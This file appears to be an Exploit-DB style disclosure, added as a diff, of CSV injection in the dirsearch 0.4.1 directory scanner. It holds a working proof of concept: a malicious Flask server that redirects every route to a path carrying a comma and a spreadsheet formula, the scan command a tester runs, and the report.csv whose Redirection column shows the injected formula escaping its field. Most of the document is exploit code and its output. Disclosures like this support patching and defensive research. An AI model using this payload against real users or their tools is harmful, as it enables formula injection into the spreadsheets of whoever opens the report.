@@ -1,0 +1,57 @@
+# Exploit Title: dirsearch 0.4.1 - CSV Injection
+# Author: Dolev Farhi
+# Date: 2021-01-05
+# Vendor Homepage: https://github.com/maurosoria/dirsearch
+# Version : 0.4.1
+# Tested on: Debian 9.13
+
+dirsearch, when used with the --csv-report flag, writes the results of crawled endpoints which redirect(, to a csv file without sanitization.
+A malicious server can redirect all of its routes/paths to a path that contains a comma and formula, e.g. /test,=1336+1, and escape the normal dirsearch CSV structure to inject its own formula.
+
+Malicious Flask Webserver:
+
+"""
+from flask import Flask, redirect
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+ return redirect('/test,=1336+1')
+
+@app.route('/admin')
+def admin():
+ return redirect('/test,=1336+1')
+
+@app.route('/login')
+def login():
+ return redirect('/test,=1336+1')
+"""
+
+
+2. Tester runs dirsearch
+root@host:~/# python3 dirsearch.py -u http://10.0.0.1 --csv-report=report.csv 
+
+
+  _|. _ _  _  _  _ _|_    v0.4.1
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, asp, aspx, jsp, html, htm, js | HTTP method: GET | Threads: 30 | Wordlist size: 2
+
+Error Log: /root/tools/dirsearch/logs/errors-21-01-06_04-29-10.log
+
+Target: http://10.0.0.1
+
+Output File: /root/tools/dirsearch/reports/10.0.0.1/_21-01-06_04-29-10.txt
+
+[04:29:10] Starting: 
+[04:29:11] 302 -  233B  - /admin  ->  http://10.0.0.1/test,=1336+1
+[04:29:11] 302 -  233B  - /login  ->  http://10.0.0.1/test,=1336+1
+
+
+3. Result CSV
+
+root@host:~/# cat report.csv
+
+Time,URL,Status,Size,Redirection
+Wed Jan  6 04:29:11 2021,http://10.0.0.1:80/admin,302,233,http://10.0.0.1/test,=1336+1
+Wed Jan  6 04:29:11 2021,http://10.0.0.1:80/login,302,233,http://10.0.0.1/test,=1336+1
